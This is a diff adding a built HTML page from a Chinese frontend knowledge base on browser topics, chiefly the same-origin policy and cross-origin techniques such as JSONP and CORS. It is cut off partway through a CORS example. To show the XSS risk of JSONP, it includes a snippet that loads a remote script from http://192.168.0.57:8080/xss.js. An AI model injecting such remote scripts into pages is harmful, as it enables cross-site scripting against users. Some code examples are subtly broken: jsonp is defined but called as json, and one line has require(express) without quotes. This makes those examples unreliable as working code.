@@ -1,0 +1,598 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>浏览器 | Frontend Knowledge Base</title>
+    <meta name="description" content="【前端学习+面试指南】 涵盖前端工程师必需的核心知识库">
+    <link rel="icon" href="/Frontend-Knowledge-Base/knowledge-base.png">
+  <link rel="manifest" href="/Frontend-Knowledge-Base/manifest.json">
+  <meta name="theme-color" content="#3eaf7c">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="msapplication-TileColor" content="#000000">
+    
+    <link rel="preload" href="/Frontend-Knowledge-Base/assets/css/0.styles.512f36c0.css" as="style"><link rel="preload" href="/Frontend-Knowledge-Base/assets/js/app.be30c89b.js" as="script"><link rel="preload" href="/Frontend-Knowledge-Base/assets/js/4.d5d74749.js" as="script"><link rel="preload" href="/Frontend-Knowledge-Base/assets/js/53.ffdc0ead.js" as="script"><link rel="preload" href="/Frontend-Knowledge-Base/assets/js/9.1a9c75bd.js" as="script"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/10.14beec70.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/11.1baa7ffd.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/12.b25e3f14.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/13.5e243a3b.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/14.8c43e0ed.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/15.8b7ce3ce.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/16.8ab4ae66.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/17.fe99a1e3.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/18.3313bd50.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/19.de937db9.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/20.1836cb3d.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/21.65652483.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/22.fb27e07b.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/23.47c1ae4c.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/24.232a53b1.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/25.c6a72e25.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/26.0a0a2701.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/27.0fdc9a1a.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/28.e889eaeb.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/29.46bd6339.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/30.7fef7b22.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/31.6d22a163.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/32.91863d2b.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/33.38e661a7.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/34.95d36277.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/35.4dcca28e.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/36.eff9b2db.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/37.83295d49.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/38.9dc5afb4.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/39.8d439768.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/40.ee0861ee.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/41.88810310.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/42.fc9b11e7.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/43.6c927e3a.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/44.f886a111.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/45.80ab5dac.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/46.3e9e3e75.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/47.0eda127c.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/48.44c82d8d.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/49.4607fb6a.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/5.2bf069a5.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/50.9f0623b6.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/51.f796f30a.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/52.14bba200.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/54.0a659db0.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/55.5742c9fa.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/56.65596741.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/57.307a563b.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/58.fae9ed04.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/59.aa64338b.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/6.90c6bd27.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/60.8ed25f8b.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/61.f7b0fdbd.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/62.8a215a5b.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/63.60ac3ff9.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/64.df85119c.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/65.f263abd9.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/66.c9dc87d6.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/67.6152f8ea.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/68.f8f9f63b.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/69.236ffdcc.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/7.567f554d.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/70.a508e7e0.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/71.a7032d11.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/72.a6250581.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/73.1a604c5b.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/74.fa6d0d2d.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/75.2839c2d3.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/76.786f0d39.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/77.6a25f56b.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/78.776f55f5.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/79.b69d3416.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/8.23699700.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/80.8a98d0eb.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/81.d9a21bed.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/82.6ac5eff6.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/83.f2c7eacb.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/click-prefetch.507fe4e7.js"><link rel="prefetch" href="/Frontend-Knowledge-Base/assets/js/vendors~docsearch.1829cd5d.js">
+    <link rel="stylesheet" href="/Frontend-Knowledge-Base/assets/css/0.styles.512f36c0.css">
+  </head>
+  <body>
+    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/Frontend-Knowledge-Base/" class="home-link router-link-active"><!----> <span class="site-name">Frontend Knowledge Base</span></a> <div class="links"><form id="search-form" role="search" class="algolia-search-wrapper search-box"><input id="algolia-search-input" class="search-query"></form> <nav class="nav-links can-hide"><div class="nav-item"><a href="/Frontend-Knowledge-Base/frontend/JavaScript/" class="nav-link">前端</a></div><div class="nav-item"><a href="/Frontend-Knowledge-Base/cs/linux/linux.html" class="nav-link">计算机基础</a></div><div class="nav-item"><a href="/Frontend-Knowledge-Base/book/" class="nav-link">书籍</a></div><div class="nav-item"><a href="/Frontend-Knowledge-Base/interview/" class="nav-link">面试</a></div><div class="nav-item"><a href="https://jinjun.wiki/" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  博客
+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></div> <a href="https://github.com/jinjun1994/Frontend-Knowledge-Base" target="_blank" rel="noopener noreferrer" class="repo-link">
+    GitHub
+    <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/Frontend-Knowledge-Base/frontend/JavaScript/" class="nav-link">前端</a></div><div class="nav-item"><a href="/Frontend-Knowledge-Base/cs/linux/linux.html" class="nav-link">计算机基础</a></div><div class="nav-item"><a href="/Frontend-Knowledge-Base/book/" class="nav-link">书籍</a></div><div class="nav-item"><a href="/Frontend-Knowledge-Base/interview/" class="nav-link">面试</a></div><div class="nav-item"><a href="https://jinjun.wiki/" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  博客
+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></div> <a href="https://github.com/jinjun1994/Frontend-Knowledge-Base" target="_blank" rel="noopener noreferrer" class="repo-link">
+    GitHub
+    <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></nav>  <ul class="sidebar-links"><li><section class="sidebar-group first collapsable"><p class="sidebar-heading"><span>JavaScript</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable"><p class="sidebar-heading"><span>css</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable"><p class="sidebar-heading"><span>html</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable"><p class="sidebar-heading open"><span>浏览器</span> <span class="arrow down"></span></p> <ul class="sidebar-group-items"><li><a href="/Frontend-Knowledge-Base/frontend/browser/browser.html" class="active sidebar-link">浏览器</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/Frontend-Knowledge-Base/frontend/browser/browser.html#dom操作" class="sidebar-link">DOM操作</a></li><li class="sidebar-sub-header"><a href="/Frontend-Knowledge-Base/frontend/browser/browser.html#事件" class="sidebar-link">事件</a></li><li class="sidebar-sub-header"><a href="/Frontend-Knowledge-Base/frontend/browser/browser.html#跨浏览器开发" class="sidebar-link">跨浏览器开发</a></li><li class="sidebar-sub-header"><a href="/Frontend-Knowledge-Base/frontend/browser/browser.html#渲染机制" class="sidebar-link">渲染机制</a></li><li class="sidebar-sub-header"><a href="/Frontend-Knowledge-Base/frontend/browser/browser.html#前端跨域" class="sidebar-link">前端跨域</a></li><li class="sidebar-sub-header"><a href="/Frontend-Knowledge-Base/frontend/browser/browser.html#同源策略" class="sidebar-link">同源策略</a></li><li class="sidebar-sub-header"><a href="/Frontend-Knowledge-Base/frontend/browser/browser.html#什么是跨域？" class="sidebar-link">什么是跨域？</a></li><li class="sidebar-sub-header"><a href="/Frontend-Knowledge-Base/frontend/browser/browser.html#实现跨域的方式" class="sidebar-link">实现跨域的方式</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/Frontend-Knowledge-Base/frontend/browser/browser.html#一、使用-jsonp-跨域" class="sidebar-link">一、使用 jsonp 跨域</a></li><li class="sidebar-sub-header"><a href="/Frontend-Knowledge-Base/frontend/browser/browser.html#二、使用-cors-跨域" class="sidebar-link">二、使用 CORS 跨域</a></li><li class="sidebar-sub-header"><a href="/Frontend-Knowledge-Base/frontend/browser/browser.html#三、使用-postmessage-实现跨域" class="sidebar-link">三、使用 postMessage 实现跨域</a></li><li class="sidebar-sub-header"><a href="/Frontend-Knowledge-Base/frontend/browser/browser.html#四、使用-window-name-实现跨域" class="sidebar-link">四、使用 window.name 实现跨域</a></li><li class="sidebar-sub-header"><a href="/Frontend-Knowledge-Base/frontend/browser/browser.html#五、使用-location-hash-实现跨域" class="sidebar-link">五、使用 location.hash 实现跨域</a></li><li class="sidebar-sub-header"><a href="/Frontend-Knowledge-Base/frontend/browser/browser.html#六、使用-document-domain-实现跨域" class="sidebar-link">六、使用 document.domain 实现跨域</a></li><li class="sidebar-sub-header"><a href="/Frontend-Knowledge-Base/frontend/browser/browser.html#七、使用-websocket-实现跨域" class="sidebar-link">七、使用 WebSocket 实现跨域</a></li><li class="sidebar-sub-header"><a href="/Frontend-Knowledge-Base/frontend/browser/browser.html#八、使用-nginx-实现跨域" class="sidebar-link">八、使用 nginx 实现跨域</a></li><li class="sidebar-sub-header"><a href="/Frontend-Knowledge-Base/frontend/browser/browser.html#九、使用-http-proxy-middleware-实现跨域" class="sidebar-link">九、使用 http-proxy-middleware 实现跨域</a></li></ul></li><li class="sidebar-sub-header"><a href="/Frontend-Knowledge-Base/frontend/browser/browser.html#浏览器存储" class="sidebar-link">浏览器存储</a></li><li class="sidebar-sub-header"><a href="/Frontend-Knowledge-Base/frontend/browser/browser.html#页面生命周期：domcontentloaded、load、beforeunload-和-unload" class="sidebar-link">页面生命周期：DOMContentLoaded、load、beforeunload 和 unload</a></li><li class="sidebar-sub-header"><a href="/Frontend-Knowledge-Base/frontend/browser/browser.html#domcontentloaded" class="sidebar-link">DOMContentLoaded</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/Frontend-Knowledge-Base/frontend/browser/browser.html#domcontentloaded-和脚本" class="sidebar-link">DOMContentLoaded 和脚本</a></li><li class="sidebar-sub-header"><a href="/Frontend-Knowledge-Base/frontend/browser/browser.html#domcontentloaded-和样式" class="sidebar-link">DOMContentLoaded 和样式</a></li><li class="sidebar-sub-header"><a href="/Frontend-Knowledge-Base/frontend/browser/browser.html#浏览器内置填写" class="sidebar-link">浏览器内置填写</a></li></ul></li><li class="sidebar-sub-header"><a href="/Frontend-Knowledge-Base/frontend/browser/browser.html#window-onload" class="sidebar-link">window.onload</a></li><li class="sidebar-sub-header"><a href="/Frontend-Knowledge-Base/frontend/browser/browser.html#window-onunload" class="sidebar-link">window.onunload</a></li><li class="sidebar-sub-header"><a href="/Frontend-Knowledge-Base/frontend/browser/browser.html#window-onbeforeunload" class="sidebar-link">window.onbeforeunload</a></li><li class="sidebar-sub-header"><a href="/Frontend-Knowledge-Base/frontend/browser/browser.html#readystate" class="sidebar-link">readyState</a></li><li class="sidebar-sub-header"><a href="/Frontend-Knowledge-Base/frontend/browser/browser.html#总结" class="sidebar-link">总结</a></li><li class="sidebar-sub-header"><a href="/Frontend-Knowledge-Base/frontend/browser/browser.html#浏览器存储-2" class="sidebar-link">浏览器存储</a></li></ul></li></ul></section></li><li><section class="sidebar-group collapsable"><p class="sidebar-heading"><span>前端框架</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable"><p class="sidebar-heading"><span>性能优化</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable"><p class="sidebar-heading"><span>node</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable"><p class="sidebar-heading"><span>数据结构与算法</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable"><p class="sidebar-heading"><span>前端工程化</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable"><p class="sidebar-heading"><span>前端图形学</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable"><p class="sidebar-heading"><span>微信小程序</span> <span class="arrow right"></span></p> <!----></section></li></ul> </aside> <div class="back-to-ceiling" style="right:1rem;bottom:3rem;width:2.5rem;height:2.5rem;border-radius:.25rem;line-height:2.5rem;background-color:rgba(231, 234, 241,.5);display:none;" data-v-7efdea1b data-v-7efdea1b><i class="iconfont icon-rocket" data-v-7efdea1b></i></div> <main class="page"> <div class="page-none"></div> <div class="page-title"><h1>浏览器</h1> <hr> <div class="pageInfo" data-v-3a11415e><i class="icon-author iconfont" data-v-3a11415e><span data-v-3a11415e>jinjun</span></i> <!----> <span id="/frontend/browser/browser.html" data-flag-title="Your Article Title" class="leancloud-visitors" data-v-ea098484 data-v-3a11415e><i class="icon-eye" style="font-size:.9rem;font-weight:normal;color:#999;" data-v-ea098484></i> <a class="leancloud-visitors-count" style="font-size:.9rem;font-weight:normal;color:#999;" data-v-ea098484></a></span></div></div> <div class="content default"><h1 id="浏览器"><a href="#浏览器" aria-hidden="true" class="header-anchor">#</a> 浏览器</h1> <h2 id="dom操作"><a href="#dom操作" aria-hidden="true" class="header-anchor">#</a> DOM操作</h2> <p>颜色</p> <p>节流、防抖</p> <h2 id="事件"><a href="#事件" aria-hidden="true" class="header-anchor">#</a> 事件</h2> <p>事件循环</p> <p>settimeout</p> <p>处理事件</p> <p>自定义事件</p> <h2 id="跨浏览器开发"><a href="#跨浏览器开发" aria-hidden="true" class="header-anchor">#</a> 跨浏览器开发</h2> <p>浏览器兼容</p> <p><a href="https://juejin.im/post/5b3da006e51d4518f140edb2#heading-5" target="_blank" rel="noopener noreferrer">如何机智地回答浏览器兼容性问题<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p><a href="https://www.jianshu.com/p/16d3e4f9b2a9" target="_blank" rel="noopener noreferrer">fastclick 解决移动端click事件300ms延迟<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p>屏幕 css html javascript</p> <p>移动端问题</p> <p>web安全</p> <h2 id="渲染机制"><a href="#渲染机制" aria-hidden="true" class="header-anchor">#</a> 渲染机制</h2> <h2 id="前端跨域"><a href="#前端跨域" aria-hidden="true" class="header-anchor">#</a> 前端跨域</h2> <h2 id="同源策略"><a href="#同源策略" aria-hidden="true" class="header-anchor">#</a> 同源策略</h2> <p>同源策略/SOP（Same origin policy）是一种约定，由 Netscape 公司 1995 年引入浏览器，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，浏览器很容易受到 XSS、CSRF 等攻击。所谓同源是指 &quot;协议 + 域名 + 端口&quot; 三者相同，即便两个不同的域名指向同一个 ip 地址，也非同源。</p> <h2 id="什么是跨域？"><a href="#什么是跨域？" aria-hidden="true" class="header-anchor">#</a> 什么是跨域？</h2> <p>当协议、域名、端口号，有一个或多个不同时，有希望可以访问并获取数据的现象称为跨域访问，同源策略限制下 <code>cookie</code>、<code>localStorage</code>、<code>dom</code>、<code>ajax</code>、<code>IndexDB</code> 都是不支持跨域的。</p> <p>假设 cookie 支持了跨域，http 协议无状态，当用户访问了一个银行网站登录后，银行网站的服务器给返回了一个 sessionId，当通过当前浏览器再访问一个恶意网站，如果 cookie 支持跨域，恶意网站将获取 sessionId 并访问银行网站，出现安全性问题；IndexDB、localStorage 等数据存储在不同域的页面切换时是获取不到的；假设 dom 元素可以跨域，在自己的页面写入一个 iframe 内部嵌入的地址是 www.baidu.com，当在百度页面登录账号密码时就可以在自己的页面获取百度的数据信息，这显然是不合理的。</p> <p>这就是为什么 <code>cookie</code>、<code>localStorage</code>、<code>dom</code>、<code>ajax</code>、<code>IndexDB</code> 会受到同源策略会限制，下面还有一点对跨域理解的误区：</p> <p>误区：同源策略限制下，访问不到后台服务器的数据，或访问到后台服务器的数据后没有返回；
+正确：同源策略限制下，可以访问到后台服务器的数据，后台服务器会正常返回数据，而被浏览器给拦截了。</p> <h2 id="实现跨域的方式"><a href="#实现跨域的方式" aria-hidden="true" class="header-anchor">#</a> 实现跨域的方式</h2> <h3 id="一、使用-jsonp-跨域"><a href="#一、使用-jsonp-跨域" aria-hidden="true" class="header-anchor">#</a> 一、使用 jsonp 跨域</h3> <p>使用场景：当自己的项目前端资源和后端部署在不同的服务器地址上，或者其他的公司需要访问自己对外公开的接口，需要实现跨域获取数据，如百度搜索。</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>// 封装 jsonp 跨域请求的方法
+function jsonp({ url, params, cb }) {
+    return new Promise((resolve, reject) =&gt; {
+        // 创建一个 script 标签帮助我们发送请求
+        let script = document.createElement(&quot;script&quot;);
+        let arr = [];
+        params = { ...params, cb };
+
+        // 循环构建键值对形式的参数
+        for (let key in params) {
+            arr.push(`${key}=${params[key]}`);
+        }
+
+        // 创建全局函数
+        window[cb] = function(data) {
+            resolve(data);
+            // 在跨域拿到数据以后将 script 标签销毁
+            document.body.removeChild(script);
+        };
+
+        // 拼接发送请求的参数并赋值到 src 属性
+        script.src = `${url}?${arr.join(&quot;&amp;&quot;)}`;
+        document.body.appendChild(script);
+    });
+}
+
+// 调用方法跨域请求百度搜索的接口
+json({
+    url: &quot;https://sp0.baidu.com/5a1Fazu8AA54nxGko9WTAnF6hhy/su&quot;,
+    params: {
+        wd: &quot;jsonp&quot;
+    },
+    cb: &quot;show&quot;
+}).then(data =&gt; {
+    // 打印请求回的数据
+    console.log(data);
+});
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br></div></div><p>缺点：</p> <ul><li>只能发送 get 请求 不支持 post、put、delete；</li> <li>不安全，容易引发 xss 攻击，别人在返回的结果中返回了下面代码。</li></ul> <div class="language- line-numbers-mode"><pre class="language-text"><code>`let script = document.createElement('script');
+script.src = &quot;http://192.168.0.57:8080/xss.js&quot;;
+document.body.appendChild(script);`;
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>会把别人的脚本引入到自己的页面中执行，如：弹窗、广告等，甚至更危险的脚本程序。</p> <h3 id="二、使用-cors-跨域"><a href="#二、使用-cors-跨域" aria-hidden="true" class="header-anchor">#</a> 二、使用 CORS 跨域</h3> <p>跨源资源共享/CORS（Cross-Origin Resource Sharing）是 W3C 的一个工作草案，定义了在必须访问跨源资源时，浏览器与服务器应该如何沟通。CORS 背后的基本思想，就是使用自定义的 HTTP 头部让浏览器与服务器进行沟通，从而决定请求或响应是应该成功，还是应该失败。</p> <p>使用场景：多用于开发时，前端与后台在不同的 ip 地址下进行数据访问。</p> <p>现在启动两个端口号不同的服务器，创建跨域条件，服务器（NodeJS）代码如下：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>// 服务器1
+const express = require(express);
+let app = express();
+app.use(express.static(__dirname));
+app.listen(3000);
+
+// 服务器2
+const express = require(&quot;express&quot;);
+let app = express();
+app.get(&quot;/getDate&quot;, function(req, res) {
+    res.end(&quot;I love you&quot;);
+});
+app.use(express.static(__dirname));
+app.listen(4000);
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><p>由于我们的 NodeJS 服务器使用 <code>express</code> 框架，在我们的项目根目录下的命令行中输入下面代码进行安装：</p> <blockquote><p>npm install express --save</p></blockquote> <p>通过访问 <a href="http://localhost/" target="_blank" rel="noopener noreferrer">http://localhost<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>:3000/index.html 获取 <code>index.html</code> 文件并执行其中的 <code>Ajax</code> 请求 <a href="http://localhost/" target="_blank" rel="noopener noreferrer">http://localhost<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>:4000/getDate 接口去获取数据，<code>index.html</code> 文件内容如下：</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>&lt;!-- 文件：index.html --&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;title&gt;CORS 跨域&lt;/title&gt;
+&lt;/head&gt;
